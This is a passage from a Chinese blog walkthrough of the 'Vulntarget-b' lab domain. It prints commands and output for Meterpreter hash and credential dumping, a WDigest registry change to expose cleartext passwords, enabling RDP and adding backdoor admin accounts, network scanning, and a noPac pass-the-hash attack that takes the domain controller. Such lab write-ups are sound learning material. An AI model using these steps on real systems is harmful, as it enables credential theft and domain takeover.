+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123211921526.png" alt="image-20231123211921526"></p>
+<p>直接就是system权限  于是导出hash</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123212016413.png" alt="image-20231123212016413"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shayebudon/article/details/124515853">net 命令大全</a></p>
+<p>这里教一个查域控的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; net time /domain</span><br><span class="line">\\WIN-UH20PRD3EAO.vulntarget.com 的当前时间是 ?2023/?11/?23 21:21:48</span><br><span class="line"></span><br><span class="line">查到域控主机名</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; ping WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">正在 Ping WIN-UH20PRD3EAO.vulntarget.com [10.0.10.100] 具有 32 字节的数据:</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">10.0.10.100 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 0ms，最长 = 0ms，平均 = 0ms</span><br><span class="line">    </span><br><span class="line">使用ping命令发现主机地址  (能ping通的前提下)</span><br></pre></td></tr></table></figure>
+<p>使用nslookup域名解析也行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; nslookup WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">������:  UnKnown</span><br><span class="line">Address:  10.0.10.100</span><br><span class="line">����:    WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">Address:  10.0.10.100</span><br></pre></td></tr></table></figure>
+<p>获取到system权限后  我们直接导出域内hash就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c35945f73d9b85be7064e79706e1baa4:::</span><br><span class="line">win10:1001:aad3b435b51404eeaad3b435b51404ee:6334d634017bb5a1ef02e6e2b158840b:::</span><br><span class="line"></span><br><span class="line">//这个是导出本地管理员的</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain      NTLM                              SHA1                                      DPAPI</span><br><span class="line">--------  ------      ----                              ----                                      -----</span><br><span class="line">WIN10$    VULNTARGET  44881dfca44eebd45932eb52b045ccc2  2b172d3ceb1c9ce19278c78425287be2c03df0ea</span><br><span class="line">win101    VULNTARGET  282d975e35846022476068ab5a3d72df  bc9ecca8d006d8152bd51db558221a0540c9d604  8d6103509e746ac0ed9641f7c21d7cf7</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain      Password</span><br><span class="line">--------  ------      --------</span><br><span class="line">(null)    (null)      (null)</span><br><span class="line">WIN10$    VULNTARGET  (null)</span><br><span class="line">win101    VULNTARGET  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain          Password</span><br><span class="line">--------  ------          --------</span><br><span class="line">(null)    (null)          (null)</span><br><span class="line">WIN10$    VULNTARGET.COM  (null)</span><br><span class="line">WIN10$    vulntarget.com  d5 b7 6a 61 89 2a 6a 1e 08 d3 78 43 41 8c de 75 55 4c a9 17 cd 00 a8 81 3f 26 fa 82 b0 84 f4 08 55 2f f5 0f 08 e1 72 0d ca 91 98 93 19 ac a3 7b 6a 53 dc f6 b2 15 aa aa 35 c7 d5 86 8d 95 3f 69 04 ce ef 6f b6 8d 72 a8 e5 8c 32 3b 4b 28 81 91 d0 74 9b 69 0b f2 9d ad 1c e4 d9 0d 39 a8 ce 82 77 d0 d6 c6 95 a0 a2 77 34 65 bd 4d a4 5d 29 fe 2a df 77 b1 a2 f4 5b c9 39 fa dd 2f 2a 61 91 d5 87 21 15 36 a0 1f 7d 4c 94 e7 89 33 4b 68 3b b2 fa 38 45 04 76 83 e9 c2 97 fc 14 30 ee 19 ed ba 72 25 5d 87 e9 d4 55 eb 49 66 bb 55 39 9f 6b 0c 8f 44 c9 a7 f4 c1 91 b2 d1 4b 79 2f ac c1 38 fe 2c d0 2e a0 27 0e d1 23 1e 97 16 9e 60 56 86 20 e4 ea 66 aa 65 cd cc f9 db 29 8d d5 7e 42 b1 a6 b9 66 5b ea f6 dc ca b4 a3 e4 6f 35 26 84 26 25</span><br><span class="line">win10$    VULNTARGET.COM  (null)</span><br><span class="line">win101    VULNTARGET.COM  (null)</span><br></pre></td></tr></table></figure>
+<p>win2012以后解决不到处明文的方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175364">https://www.anquanke.com/post/id/175364</a></p>
+<p>这个是只能导出域内hash值  password是null  那么通过我们修改注册表的方法是可以进行password显示出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123213048096.png" alt="image-20231123213048096"></p>
+<p>如何让这台机器的账户重新进行登录就行了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123213237658.png" alt="image-20231123213237658"></p>
+<p>成功的抓取到了密码</p>
+<p>上传那个sharphound进去跑一下分析一下域内环境</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123214748834.png" alt="image-20231123214748834"></p>
+<p>能成功的rdp上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">//上面的代码时开启了3389端口</span><br><span class="line"></span><br><span class="line">//下面的代码时新加一个用户到本地管理员组如何rdp上去</span><br><span class="line"></span><br><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain vulntarget.com --ExcludeDCs</span><br></pre></td></tr></table></figure>
+<p>扫一下ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::8c22:e9be:8a8c:2b3c%12</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.66</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet1:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::14f3:2c89:4bb1:cc63%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.10.99</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>存在这个10段</p>
+<p>fscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br><span class="line">fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.0.10.99      is alive</span><br><span class="line">(icmp) Target 10.0.10.100     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.0.10.100:88 open</span><br><span class="line">10.0.10.100:53 open</span><br><span class="line">10.0.10.100:110 open</span><br><span class="line">10.0.10.99:110 open</span><br><span class="line">10.0.10.99:139 open</span><br><span class="line">10.0.10.100:25 open</span><br><span class="line">10.0.10.99:25 open</span><br><span class="line">10.0.10.100:139 open</span><br><span class="line">10.0.10.100:135 open</span><br><span class="line">10.0.10.99:135 open</span><br><span class="line">10.0.10.100:389 open</span><br><span class="line">10.0.10.100:445 open</span><br><span class="line">10.0.10.99:445 open</span><br><span class="line">10.0.10.100:464 open</span><br><span class="line">10.0.10.100:593 open</span><br><span class="line">10.0.10.100:636 open</span><br><span class="line">10.0.10.100:3268 open</span><br><span class="line">10.0.10.100:3269 open</span><br><span class="line">10.0.10.99:3306 open</span><br><span class="line">10.0.10.99:3389 open</span><br><span class="line">10.0.10.99:5040 open</span><br><span class="line">10.0.10.100:5985 open</span><br><span class="line">10.0.10.99:8080 open</span><br><span class="line">10.0.10.100:9389 open</span><br><span class="line">[*] alive ports len is: 24</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.100</span><br><span class="line">   [-&gt;]WIN-UH20PRD3EAO</span><br><span class="line">   [-&gt;]10.0.10.100</span><br><span class="line">[+] 10.0.10.100 MS17-010        (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 10.0.10.100     [+]DC WIN-UH20PRD3EAO.vulntarget.com      Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://10.0.10.100:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle: http://10.0.10.99:8080    code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://10.0.10.99:8080    [禅道] </span><br><span class="line">[+] RDP:10.0.10.99:3389:administrator admin@123</span><br><span class="line">已完成 24/24</span><br><span class="line">[*] 扫描结束,耗时: 2m50.6807079s</span><br></pre></td></tr></table></figure>
+<p>发现域控主机   10.0.10.100</p>
+<p>然后挂二级代理  然后打nopac   明天好好研究一下为啥能打nopac</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py vulntarget.com/win101 -hashes &#x27;:282d975e35846022476068ab5a3d72df&#x27; -dc-ip 10.0.10.100 --impersonate Administrator -create-child -use-ldap -shell</span><br><span class="line"></span><br><span class="line">执行该命令</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231123224306319.png" alt="image-20231123224306319"></p>
+<p>拿下域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加域管</span><br><span class="line"></span><br><span class="line">net user admin QWEasd@123 /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io">ke1nys</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io/posts/cc293b70.html">https://ke1nys.github.io/posts/cc293b70.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ke1nys.github.io" target="_blank">ke1nys`Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/bb2e0be6.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulntarget-c</div></div></a></div><div class="next-post pull-right"><a href="/posts/55206aca.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulntarget-a</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/9fa2b7fe.html" title="AD域-预身份验证"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-14</div><div class="title">AD域-预身份验证</div></div></a></div><div><a href="/posts/f7872afc.html" title="JQCTF-Web复现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-05</div><div class="title">JQCTF-Web复现</div></div></a></div><div><a href="/posts/af4fc312.html" title="Msf反弹shell与不出网主机上线"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-04</div><div class="title">Msf反弹shell与不出网主机上线</div></div></a></div><div><a href="/posts/7a8168b7.html" title="Potato家族本地提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-03</div><div class="title">Potato家族本地提权</div></div></a></div><div><a href="/posts/29edf1b0.html" title="VulnStack1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-19</div><div class="title">VulnStack1</div></div></a></div><div><a href="/posts/c08e5485.html" title="VulnStack7"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-03</div><div class="title">VulnStack7</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ke1nys</div><div class="author-info__description">生命不息,折腾不止</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">160</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">125</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ke1nys/ke1nys.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客一起学习嗷~</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f07ab6bb.html" title="TPCTF2023-walk off the earth"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TPCTF2023-walk off the earth"/></a><div class="content"><a class="title" href="/posts/f07ab6bb.html" title="TPCTF2023-walk off the earth">TPCTF2023-walk off the earth</a><time datetime="2023-12-06T02:44:32.000Z" title="发表于 2023-12-06 10:44:32">2023-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f7872afc.html" title="JQCTF-Web复现"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JQCTF-Web复现"/></a><div class="content"><a class="title" href="/posts/f7872afc.html" title="JQCTF-Web复现">JQCTF-Web复现</a><time datetime="2023-12-05T11:05:58.000Z" title="发表于 2023-12-05 19:05:58">2023-12-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bb2e0be6.html" title="Vulntarget-c"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulntarget-c"/></a><div class="content"><a class="title" href="/posts/bb2e0be6.html" title="Vulntarget-c">Vulntarget-c</a><time datetime="2023-11-28T11:57:45.000Z" title="发表于 2023-11-28 19:57:45">2023-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/cc293b70.html" title="Vulntarget-b"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulntarget-b"/></a><div class="content"><a class="title" href="/posts/cc293b70.html" title="Vulntarget-b">Vulntarget-b</a><time datetime="2023-11-23T11:19:00.000Z" title="发表于 2023-11-23 19:19:00">2023-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/55206aca.html" title="Vulntarget-a"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulntarget-a"/></a><div class="content"><a class="title" href="/posts/55206aca.html" title="Vulntarget-a">Vulntarget-a</a><time datetime="2023-11-13T02:20:11.000Z" title="发表于 2023-11-13 10:20:11">2023-11-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ke1nys</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script async src="/js/ali_font.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
